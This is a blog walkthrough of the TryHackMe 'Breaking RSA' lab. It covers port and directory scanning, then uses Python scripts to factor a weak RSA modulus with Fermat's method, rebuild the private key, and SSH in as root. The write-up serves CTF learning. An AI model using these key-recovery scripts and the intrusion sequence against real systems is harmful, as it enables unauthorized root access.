---
title: "TryHackMe: Breaking RSA"
author: cilgin
date: 2025-07-01 15:57:25 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-01-TryHackMe-Breaking_RSA/main.png
---

Hey there, fellow hackers and curious minds! Today, we're diving into the [breakrsa](https://tryhackme.com/room/breakrsa) room on TryHackMe. This room is a fantastic lesson in why cryptographic implementation matters. We're about to go from a simple webpage to full root access by exploiting a classic mistake in RSA key generation.

So, grab your favorite caffeinated beverage, fire up your terminal, and let's become masters of... well, at least of breaking this _one_ specific key.

---

### Step 1: Reconnaissance - The Nmap Scan

First things first, let's set our target IP as an environment variable. It just makes life easier, and who doesn't love a good shortcut?

```bash
# Set the target IP address for easy access
export IP=10.10.243.171
```

Every good hack starts with a little recon. We need to know what doors and windows are open on our target machine. For this, we'll use our trusty digital bloodhound, `nmap`.

And here's what `nmap` found for us:

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-01 16:00 +0300
Nmap scan report for 10.10.243.171
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a8:e5:14:9a:b0:51:0a:ae:ea:70:01:c8:bd:40:f3:58 (RSA)
|   256 e2:ad:f4:44:b5:7d:59:64:69:49:e9:4d:3f:7c:2a:16 (ECDSA)
|_  256 38:8a:a6:68:05:dd:3d:5c:f9:df:37:ff:9c:1e:0c:55 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Jack Of All Trades
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.30 seconds
```

Excellent! We've got two open ports: **Port 22 (SSH)** and **Port 80 (HTTP)**. This is a classic combo: a web server to poke around on and an SSH port for our grand entrance later.

---

### Step 2: Web Server - What's Cookin'?

Let's see what the web server on Port 80 has to offer. A simple `curl` should do the trick.

```bash
❯ curl $IP
```

The server responds with this lovely piece of HTML:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Jack Of All Trades</title>
    <style>
      header {
        text-align: center;
        font-size: 3em;
      }
    </style>
  </head>
  <body>
    <header>
      <p>
        "A jack of all trades is a master of none but oftentimes better than a
        master of one"
      </p>
    </header>
  </body>
</html>
```

A philosophical quote on a landing page? Suspicious! Let's file that away in our "probably a hint" folder and see if there are any hidden directories. For that, we'll need a bigger tool.

---

### Step 3: Directory Fuzzing - Unleash the Gobuster!

A static page is nice, but the real treasures are often hidden. It's time to let `gobuster` off its leash to find hidden directories and files.

```bash
❯ gobuster dir -w common.txt -u http://$IP -x md,js,html,php,py,css,txt -t 50
```

And here comes the output:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.171
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,txt,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/**********          (Status: 301) [Size: 178] [--> http://10.10.243.171/************/]
/index.html           (Status: 200) [Size: 384]
/index.html           (Status: 200) [Size: 384]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

Bingo! `gobuster` found the secret direcetory. Upon visiting it, we find two files:

1.  An RSA public key (`id_rsa.pub`).
2.  A log file with a _very_ interesting message.

Here's what the log file says:

> The library we are using to generate SSH keys implements RSA poorly. The two
> randomly selected prime numbers (p and q) are very close to one another. Such
> bad keys can easily be broken with Fermat's factorization method.
>
> Also, SSH root login is enabled.
>
> <https://github.com/murtaza-u/zet/tree/main/20220808171808>

Well, if that isn't the biggest hint in the history of hints! The note is practically screaming the vulnerability at us. It's time to put on our mathematician hats.

---

### Step 4: The Crackening - Exploiting Weak RSA

This is where the fun begins. We have everything we need to break the RSA key.

#### Part 1: Extracting `n` and `e` from the Public Key

Every RSA public key consists of two numbers: `n` (the modulus) and `e` (the public exponent). We need to extract these from the `id_rsa.pub` file.

First, let's get a look at the key's fingerprint.

```bash
❯ ssh-keygen -lf id_rsa.pub
**** SHA256:DIqTDIhboydTh2QU6i58JP+5aDRnLBPT8GwVun1n0Co no comment (RSA)
```

Now, let's use a small Python script to pull out `n` and `e`. You'll need the `pycryptodome` library for this.

```bash
# Install the necessary Python library
pip install pycryptodome
```

And here's the script to get our values:

```python
from Crypto.PublicKey import RSA

# Open the public key file and import it
with open("id_rsa.pub", "rb") as f:
    key = RSA.import_key(f.read())
    # Print the modulus (n) and the public exponent (e)
    print("n =", key.n)
    print("e =", key.e)
```

Run this script, and you'll have your `n` and `e` constants. Keep them handy!

#### Part 2: Finding `p` and `q` with Fermat's Factorization

As the hint told us, the prime numbers `p` and `q` (which are multiplied to get `n`) are too close together. This is a fatal flaw that allows us to use **Fermat's factorization method** to find them relatively easily.

The room provides a script to do just that. This script is a lifesaver!

```python
from gmpy2 import isqrt
from math import lcm

def factorize(n):
    if (n & 1) == 0:
        return (n/2, 2)

    a = isqrt(n)

    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b

print(factorize("Replace Here"))
```

Replace `"write your n constant"` with your actual `n` value, run the script, and voilà! You now have `p` and `q`.

#### Part 3: Forging the Private Key

We have `n`, `e`, `p`, and `q`. Now, we just need to calculate `d` (the private exponent) to complete our private key.

Here's the final script to assemble our key:

```python
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse

# Replace these with your actual values!
n = ...  # The modulus you found earlier
e = ...  # The public exponent (usually 65537)
p = ...  # The first prime factor you found
q = ...  # The second prime factor you found

# Calculate phi, which is a necessary step for finding 'd'
phi = (p - 1) * (q - 1)

# Calculate 'd', the modular multiplicative inverse of e mod phi
d = inverse(e, phi)

# Construct the full private key from all its components
key = RSA.construct((n, e, d, p, q))

# Save our shiny new private key to a file
with open("private_key.pem", "wb") as f:
    f.write(key.export_key("PEM"))

print("Private key 'private_key.pem' has been generated successfully!")
```

Fill in the variables, run the script, and you'll have a `private_key.pem` file ready for action.

---

### Step 5: The Grand Finale - Root Access

We have the key. The door (SSH) is open. The note said `root` login is enabled. It's time to walk in.

First, we need to set the correct permissions on our new private key. SSH is very picky and won't use a key that others can read.

```bash
❯ chmod 400 private_key.pem
```

Now for the moment of truth. Let's SSH in as `root`.

```bash
❯ ssh root@$IP -i private_key.pem
```

You should be greeted with a root shell. The system is ours! All that's left is to claim our prize.

```bash
root@ip-10-10-243-171:~# cat flag
**********************************
```

### Conclusion

And there you have it! We went from a simple webpage to a root shell by exploiting a fundamental flaw in an RSA key's implementation. This room is a perfect example of how even the most robust cryptographic systems can be defeated if they aren't used correctly.

Remember: choosing primes for RSA is not a time to get lazy. Keep them far, far apart!

Happy hacking!
